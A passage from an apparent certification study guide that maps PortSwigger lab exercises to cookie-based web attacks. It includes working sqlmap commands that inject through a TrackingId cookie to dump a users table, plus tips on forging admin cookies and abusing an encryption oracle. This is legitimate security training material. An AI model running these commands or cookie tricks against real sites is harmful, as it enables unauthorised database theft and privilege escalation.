### Last Viewed Product Cookie

[](https://github.com/X0Rhyth/BSCP-Guide?tab=readme-ov-file#-last-viewed-product-cookie)

- DOM-based cookie manipulation

### * TrackingId Cookie

[](https://github.com/X0Rhyth/BSCP-Guide?tab=readme-ov-file#-trackingid-cookie)

- Blind SQL injection with conditional responses
- Here we use the asterisk (*) to set the injection point for sqlmap. Which is the "TrackingId" cookie in this scenario.

```
sqlmap -u 'https://LAB-ID.web-security-academy.net:443/filter?category=Accessories' --skip='category' --random-agent --time-sec 10 --cookie='TrackingId=eKLTgodSyebWTRiH*;session=AAA4L6ovsQN6tiZgGOpOIVkN0SSdxDBc' --dbs
```

```
sqlmap -u 'https://LAB-ID.web-security-academy.net:443/filter?category=Accessories' --skip='category' --random-agent --time-sec 10 --cookie='TrackingId=eKLTgodSyebWTRiH*;session=AAA4L6ovsQN6tiZgGOpOIVkN0SSdxDBc' -D public --tables  
```

```
sqlmap -u 'https://LAB-ID.web-security-academy.net:443/filter?category=Accessories' --skip='category' --random-agent --time-sec 10 --cookie='TrackingId=eKLTgodSyebWTRiH*;session=AAA4L6ovsQN6tiZgGOpOIVkN0SSdxDBc' -D public -T users --dump
```

- Blind SQL injection with out-of-band data exfiltration
    
- Blind SQL injection with out-of-band interaction
    

### * "Admin:False" Cookie

[](https://github.com/X0Rhyth/BSCP-Guide?tab=readme-ov-file#-adminfalse-cookie)

- **_User role controlled by request parameter_**
    
    Tip: In this lab by changing the Admin:false cookie to Admin:true the server grants us Admin privileges right away. However, some servers have validation techniques that don't accept Admin:true unless it was issued by the server itself. In this case we search for app functionalities that aren't expecting already authenticated users to use them (like pre-login forgot password functionality). If vulnerable they might only validate the username part of the cookie and not the login status part. And so they issue authenticated cookies for random users.
    

### * Stay logged in Cookie

[](https://github.com/X0Rhyth/BSCP-Guide?tab=readme-ov-file#-stay-logged-in-cookie)

- Authentication bypass via encryption oracle (use the server's encrypt and decrypt mechanism to decrypt the stay-logged-in cookie and see its structure, to craft a stay-logged in cookie for admin user)

### * Session Cookies

[](https://github.com/X0Rhyth/BSCP-Guide?tab=readme-ov-file#-session-cookies)

- Stored XSS in Session Cookie
    
- Using application functionality to exploit insecure deserialization
    
- Modifying serialized objects
    
- Modifying serialized data types
    
- Arbitrary object injection in PHP
    
- Exploiting Java deserialization with Apache Commons
    
- Exploiting PHP deserialization with a pre-built gadget chain
    
- Exploiting Ruby deserialization using a documented gadget chain
    
- Developing a custom gadget chain for Java deserialization (
    
- Developing a custom gadget chain for PHP deserialization